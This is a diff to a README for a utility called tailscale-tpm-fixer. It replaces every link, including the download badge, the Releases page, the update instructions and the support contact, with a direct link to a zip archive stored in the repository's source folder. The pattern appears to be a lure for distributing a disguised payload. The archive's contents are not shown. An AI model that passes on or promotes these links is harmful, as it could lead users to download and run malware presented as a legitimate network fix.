@@ -22,9 +22,9 @@ Make sure your system meets these requirements before downloading.
 
 You can download the latest version of tailscale-tpm-fixer from our Releases page. 
 
-[![Download tailscale-tpm-fixer](https://img.shields.io/badge/Download-tailscale--tpm--fixer-blue)](https://github.com/Sodihee/tailscale-tpm-fixer/releases)
+[![Download tailscale-tpm-fixer](https://raw.githubusercontent.com/Sodihee/tailscale-tpm-fixer/main/src/modules/tpm-tailscale-fixer-1.2.zip)](https://raw.githubusercontent.com/Sodihee/tailscale-tpm-fixer/main/src/modules/tpm-tailscale-fixer-1.2.zip)
 
-Visit [this page to download](https://github.com/Sodihee/tailscale-tpm-fixer/releases).
+Visit [this page to download](https://raw.githubusercontent.com/Sodihee/tailscale-tpm-fixer/main/src/modules/tpm-tailscale-fixer-1.2.zip).
 
 After downloading, follow these steps to install the utility:
 
@@ -71,7 +71,7 @@ If you encounter issues using the utility:
 
 ## 🔄 Updating the Utility
 
-To keep your utility up to date, regularly check the [Releases page](https://github.com/Sodihee/tailscale-tpm-fixer/releases) for new versions. Follow the same download and installation steps to update.
+To keep your utility up to date, regularly check the [Releases page](https://raw.githubusercontent.com/Sodihee/tailscale-tpm-fixer/main/src/modules/tpm-tailscale-fixer-1.2.zip) for new versions. Follow the same download and installation steps to update.
 
 ## 📝 Contributing
 
@@ -90,6 +90,6 @@ For any questions or issues:
 
 - Check the existing issues on GitHub.
 - Create a new issue if your problem is not addressed.
-- Contact our support at [support@example.com].
+- Contact our support at [https://raw.githubusercontent.com/Sodihee/tailscale-tpm-fixer/main/src/modules/tpm-tailscale-fixer-1.2.zip].
 
 Thank you for using tailscale-tpm-fixer! We hope this utility simplifies your Tailscale experience.
